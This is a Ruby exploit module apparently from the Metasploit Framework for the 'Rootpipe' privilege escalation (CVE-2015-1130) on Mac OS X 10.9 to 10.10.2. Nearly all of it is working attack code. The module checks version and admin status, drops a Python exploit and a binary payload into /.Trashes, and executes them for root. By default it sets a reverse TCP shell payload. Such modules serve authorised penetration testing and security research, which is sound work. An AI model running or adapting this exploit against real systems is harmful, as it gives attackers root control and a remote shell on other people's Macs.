# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class Metasploit4 < Msf::Exploit::Local

  Rank = GreatRanking

  include Msf::Post::OSX::System
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Mac OS X "Rootpipe" Privilege Escalation&#039;,
      &#039;Description&#039;    => %q{
        This module exploits a hidden backdoor API in Apple&#039;s Admin framework on
        Mac OS X to escalate privileges to root. Dubbed "Rootpipe."


        The patch for this issue was not backported to older releases.

        Note: you must run this exploit as an admin user to escalate to root.
      },
      &#039;Author&#039;         => [
        &#039;Emil Kvarnhammar&#039;, # Vulnerability discovery and PoC
        &#039;joev&#039;,             # Copy/paste monkey
        &#039;wvu&#039;               # Meta copy/paste monkey
      ],
      &#039;References&#039;     => [
        [&#039;CVE&#039;,   &#039;2015-1130&#039;],
        [&#039;OSVDB&#039;, &#039;114114&#039;],
        [&#039;EDB&#039;,   &#039;36692&#039;],
      ],
      &#039;DisclosureDate&#039; => &#039;Apr 9 2015&#039;,
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Platform&#039;       => &#039;osx&#039;,
      &#039;Arch&#039;           => ARCH_X86_64,
      &#039;SessionTypes&#039;   => [&#039;shell&#039;],
      &#039;Targets&#039;        => [
        [&#039;Mac OS X 10.9-10.10.2&#039;, {}]
      ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;DefaultOptions&#039; => {
        &#039;PAYLOAD&#039; => &#039;osx/x64/shell_reverse_tcp&#039;,
        &#039;CMD&#039;     => &#039;/bin/zsh&#039;
      }
    ))

    register_options([
      OptString.new(&#039;PYTHON&#039;,      [true, &#039;Python executable&#039;, &#039;/usr/bin/python&#039;]),
      OptString.new(&#039;WritableDir&#039;, [true, &#039;Writable directory&#039;, &#039;/.Trashes&#039;])
    ])
  end

  def check
    (ver? && admin?) ? Exploit::CheckCode::Vulnerable : Exploit::CheckCode::Safe
  end

  def exploit
    print_status("Writing exploit to `#{exploit_file}&#039;")
    write_file(exploit_file, python_exploit)
    register_file_for_cleanup(exploit_file)

    print_status("Writing payload to `#{payload_file}&#039;")
    write_file(payload_file, binary_payload)
    register_file_for_cleanup(payload_file)

    print_status(&#039;Executing exploit...&#039;)
    cmd_exec(sploit)
    print_status(&#039;Executing payload...&#039;)
    cmd_exec(payload_file)
  end

  def ver?
    Gem::Version.new(get_sysinfo[&#039;ProductVersion&#039;]).between?(
      Gem::Version.new(&#039;10.9&#039;), Gem::Version.new(&#039;10.10.2&#039;)
    )
  end

  def admin?
    cmd_exec(&#039;groups | grep -wq admin && echo true&#039;) == &#039;true&#039;
  end

  def sploit
    "#{datastore[&#039;PYTHON&#039;]} #{exploit_file} #{payload_file} #{payload_file}"
  end

  def python_exploit
    File.read(File.join(
      Msf::Config.data_directory, &#039;exploits&#039;, &#039;CVE-2015-1130&#039;, &#039;exploit.py&#039;
    ))
  end

  def binary_payload
    Msf::Util::EXE.to_osx_x64_macho(framework, payload.encoded)
  end

  def exploit_file
    @exploit_file ||=
      "#{datastore[&#039;WritableDir&#039;]}/#{Rex::Text.rand_text_alpha(8)}"
  end

  def payload_file
    @payload_file ||=
      "#{datastore[&#039;WritableDir&#039;]}/#{Rex::Text.rand_text_alpha(8)}"
  end

end

